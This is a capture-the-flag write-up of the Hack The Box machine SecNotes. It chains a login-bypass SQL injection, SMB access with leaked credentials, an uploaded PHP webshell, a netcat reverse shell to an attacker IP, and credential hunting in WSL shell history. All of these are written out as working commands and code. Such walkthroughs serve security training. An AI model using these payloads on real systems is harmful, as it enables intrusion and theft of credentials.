Hack The Box: SecNotes Writeup

Machine: SecNotesDifficulty: MediumTechnique Stack: SQL Injection, SMB Enumeration, RCE via PHP Webshell, WSL Escape

🔍 Enumeration

We begin with an Nmap scan:

nmap -sC -sV -oN nmap.log 10.10.10.97

Discovered services:

80/tcp - HTTP (Microsoft IIS)

445/tcp - SMB

Navigating to port 80 reveals a login page with the option to register. After testing default creds, we create a user: user123:password123.

The app allows us to:

Create/delete notes

Change our password

Contact the admin

🐞 Exploitation – XSS & SQLi

A reflected XSS was possible in note fields, but attempts to steal cookies from the admin failed.

After some testing, SQL injection via the username field during registration was successful. Using:

user' OR 1=1#

we bypass login authentication and access other users' notes.

Found Notes:

One note revealed SMB credentials:

Username: tyler
Password: 92g!mA8BGjOirkL%OG*&

📁 SMB Enumeration

Using the credentials:

smbclient -U tyler \\10.10.10.97\new-site

Reveals hosted IIS files. To confirm it's live, upload a test file, then access it via browser. Success.

🧠 Remote Code Execution

Uploaded a basic PHP webshell to gain command execution:

<form action="rce.php" method="get">
  <input type="text" name="cmd">
  <input type="submit">
  <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
</form>

Accessing this webshell provides us with command execution. We read the user flag from the shell.

🛠 Privilege Escalation

Step 1: Upgrade Shell

Upload nc64.exe to gain a proper reverse shell:

nc64.exe -e cmd.exe <your-ip> 4444

Catch it using netcat:

nc -lvnp 4444

Step 2: Investigating WSL

We find a Distros/Ubuntu folder with WSL files like ubuntu.exe, install.tar.gz, etc. Running wsl.exe gives us a Linux shell.

Upgrade it using Python:

python -c 'import pty; pty.spawn("/bin/bash")'

Step 3: Credential Discovery

In .bash_history we find cleartext administrator SMB credentials.

✅ Root Access Achieved

Using the admin credentials and full shell access via WSL, we collect the root flag and complete the box.

🧠 Lessons Learned

SQLi can be hidden in registration flows

SMB access + file hosting = quick RCE path

WSL environments can expose Linux shell access on Windows boxes

.bash_history is gold when hunting for creds

Status: OwnedFlags: user.txt, root.txtTools Used: Nmap, Burp, SMBClient, Netcat, PHP Webshell, Python, WSL

💀 This box is a perfect example of web + infra chaining, demonstrating how light misconfigurations lead to full pwn when stacked cleverly.

